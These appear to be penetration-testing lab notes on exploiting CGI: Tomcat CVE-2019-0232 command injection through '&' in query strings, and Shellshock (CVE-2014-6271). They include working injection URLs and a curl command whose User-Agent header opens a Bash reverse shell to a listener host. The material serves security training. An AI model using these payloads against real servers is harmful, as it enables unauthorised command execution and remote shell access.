# Attacking Tomcat CGI

**CVE-2019-0232** is a critical RCE vulnerability in Apache Tomcat affecting Windows systems with `enableCmdLineArguments` enabled. It exploits a command injection flaw in the CGI Servlet's input validation, allowing arbitrary command execution.

**Affected Versions:**
- Tomcat `9.0.0.M1` to `9.0.17`
- Tomcat `8.5.0` to `8.5.39`
- Tomcat `7.0.0` to `7.0.93`

**What is CGI Servlet?**
A component enabling Tomcat to communicate with external applications (CGI scripts in Perl, Python, Bash) outside the Tomcat JVM. It acts as middleware between web servers and external resources like databases, receiving browser requests and forwarding them to CGI scripts for processing.

**CGI Scripts - Pros & Cons:**

| Advantages | Disadvantages |
|------------|---------------|
| Simple for generating dynamic content | Memory overhead per request |
| Use any language (stdin/stdout capable) | Can't cache data between requests |
| Reuse existing code | Reduces server performance |

**The `enableCmdLineArguments` Setting:**
Controls whether query strings become command-line arguments for CGI scripts. When `true`, the servlet parses query strings and passes them as script arguments, enabling parameter passing without environment variables.

**Example Usage:**
```
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```
Scripts switch actions based on parameters (`action=title` vs `action=author`).

**The Vulnerability:**
On Windows, the CGI Servlet fails to properly validate browser input before passing it to CGI scripts, enabling OS command injection. Attackers append commands using `&` as separator.

**Exploitation Example:**
```
http://example.com/cgi-bin/hello.bat?&dir
```
This passes `&dir` as an argument to `hello.bat`, executing `dir` on the server. Attackers control input to inject arbitrary commands after `&`, achieving full server compromise.

---

**Example Use Case - Bookstore Search:**

**Scenario:**
- CGI script for book searching
- Two actions: search by title OR search by author

**Search by Title:**
`http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby`
- action=title → search by book title
- query=the+great+gatsby → search term

**Search by Author:**
`http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald`
- action=author → search by author name
- query=fitzgerald → search term

**Script Logic:**
```
# Pseudo-code
if action == "title":
    search_by_title(query)
elif action == "author":
    search_by_author(query)
```

**Advantage:**
- Single script handles multiple actions
- User-friendly URLs
- Easy parameter passing
- Flexible functionality

---

**The Vulnerability Explained:**

**Root Cause:**
- `enableCmdLineArguments` enabled on Windows
- CGI Servlet lacks proper input validation
- User input passed directly to CGI scripts
- No sanitization of special characters

**Attack Vector:**
- Operating System Command Injection
- Inject malicious commands into legitimate ones
- Execute arbitrary commands on target system

**Windows-Specific Issue:**
- Command separator: `&`
- Allows chaining multiple commands
- Example: `command1 & command2`

---

**Exploitation Mechanics:**

**Basic Command Injection:**
```
Valid command: hello.bat
Injected: hello.bat & dir
Result: Executes both hello.bat AND dir
```

**Attack URL:**
```
http://example.com/cgi-bin/hello.bat?&dir
```

**What Happens:**
1. URL parameter: `&dir`
2. Passed as argument to `hello.bat`
3. Windows interprets `&` as command separator
4. Executes `dir` command on server
5. Attacker receives directory listing

**Advanced Exploitation:**
```
?&whoami           → Get current user
?&ipconfig         → Network configuration
?&net user         → List users
?&type C:\file.txt → Read files
?&powershell ...   → Execute PowerShell
```

## 2. Exploitation

As discussed above, we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`. We now have a valid CGI script path discovered during the enumeration at `http://10.129.204.227:8080/cgi/welcome.bat`

`http://10.129.204.227:8080/cgi/welcome.bat?&dir`

Navigating to the above URL returns the output for the `dir` batch command, however trying to run other common windows command line apps, such as `whoami` doesn't return an output.

# Attacking Common Gateway Interface (CGI) Applications - Shellshock

**Common Gateway Interface (CGI)** is middleware that helps web servers render dynamic pages and create customized responses. It enables web servers to access external applications, databases, and information sources. CGI scripts reside in the /CGI-bin directory and can be written in C, C++, Java, PERL, etc., running in the web server's security context.

**Common Uses:**
- Guest books, forms (email, feedback, registration)
- Mailing lists, blogs
- Dynamic user interaction
- Form data processing

**Key Characteristics:**

- Language-independent
- Simpler than server-side programming for certain tasks
- Perform advanced tasks with simple code

A graphical depiction of how CGI works can be seen below:
<img width="524" height="160" alt="image" src="https://github.com/user-attachments/assets/a1bef3cd-eae8-4440-baee-96c5f79a6774" />

**How CGI Works:**
1. CGI scripts stored in /CGI-bin directory
2. User requests via URL: https://acme.com/cgi-bin/newchiscript.pl
3. Server executes script
4. Output returned to web client

**Primary Use Cases:**
- Dynamic server-user interaction
- Form submission processing (user submits data → CGI processes → server returns result)

**Disadvantages:**
- New process per HTTP request (high memory usage)
- New database connection each time
- No data caching between page loads
- Inefficient resource usage

**Current Status:**
- Risks and inefficiencies outweigh benefits
- Hasn't evolved for modern web applications
- Superseded by faster, more secure technologies
- Still found in legacy systems and embedded devices

**Pentesting Relevance:**
- Despite being outdated, testers encounter CGI in legacy web applications and embedded devices during assessments.

---

## 1. CGI Attacks

**Shellshock (CVE-2014-6271)**, the "Bash bug," is perhaps the most well-known CGI attack, discovered in 2014 and still occasionally found during penetration tests. It's a security flaw in GNU Bash (up to version 4.3) allowing execution of unintended commands via environment variables. At discovery, this was a 25-year-old bug posing a significant worldwide threat.

## Shellshock via CGI

**The Vulnerability:**
Exploits how old Bash versions incorrectly save environment variables. Normally, shell functions stop where defined, but vulnerable Bash versions allow attackers to execute OS commands appended after function definitions in environment variables.

**Simple Test Example:**
```bash
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

**Breakdown:**
- `y='() { :;};'` → Bash interprets as function definition for variable `y`
- Function does nothing, returns exit code `0`
- `echo vulnerable-shellshock` → Executes during import if vulnerable
- Any command (including reverse shells) runs in web server user context (typically `www-data`)
- Privilege escalation usually needed afterward
- Rare cases: Direct `root` access if web server runs elevated

**Vulnerable System Output:**
```
vulnerable-shellshock
not vulnerable
```

**Patched System Output:**
```
not vulnerable
```

**Modern Protections:**
- Patched Bash doesn't execute code after function definitions
- `y=() {...}` no longer interpreted as function definition
- Function definitions now require `BASH_FUNC_` prefix in environment variables

**Exploitation Context:**
- Relatively simple to exploit
- Can still be found in legacy systems
- Targets CGI scripts that process environment variables

**Exploitation to Reverse Shell Access:**

Once the vulnerability has been confirmed, we can obtain reverse shell access in many ways. In this example, we use a simple Bash one-liner and get a callback on our Netcat listener.
```
$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
